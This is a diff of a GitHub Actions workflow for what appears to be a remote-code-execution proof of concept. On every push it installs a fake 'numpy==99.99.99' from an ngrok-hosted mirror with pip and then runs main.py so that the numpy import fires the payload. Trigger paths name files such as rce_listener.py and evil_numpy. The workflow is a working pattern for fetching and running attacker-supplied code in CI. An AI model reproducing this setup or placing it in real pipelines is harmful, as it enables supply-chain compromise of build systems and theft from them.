@@ -4,29 +4,36 @@ on:
   push:
     branches:
       - main
+    paths:
+      - 'main.py'
+      - 'poc_subprocess_index_attack.py'
+      - 'rce_listener.py'
+      - 'evil_numpy/**'
+      - 'requirements.txt'
+      - '.github/workflows/ci.yml'
   workflow_dispatch:
 
 jobs:
   rce_proof:
-    name: 🚀 RCE via Fake NumPy
+    name: 🚀 Execute RCE via Fake NumPy
     runs-on: ubuntu-latest
 
     steps:
       - name: 📥 Checkout code
         uses: actions/checkout@v3
 
-      - name: 🐍 Setup Python 3.10
+      - name: 🐍 Set up Python 3.10
         uses: actions/setup-python@v4
         with:
           python-version: '3.10'
 
-      - name: 📦 Install requirements from malicious numpy mirror
+      - name: 📦 Install malicious NumPy from ngrok mirror
         run: |
-          echo "[*] Installing requirements from ngrok mirror..."
-          pip install --find-links https://74cb59ca3c50.ngrok-free.app -r requirements.txt
+          echo "[*] Installing fake numpy from ngrok mirror..."
+          pip install --find-links https://74cb59ca3c50.ngrok-free.app numpy==99.99.99
 
-      - name: 🔥 Trigger RCE by importing numpy
+      - name: 🔥 Trigger RCE payload by importing numpy
         run: |
-          echo "[*] Running main.py to trigger RCE"
+          echo "[*] Executing main.py (this triggers the RCE via numpy)"
           python3 main.py
 
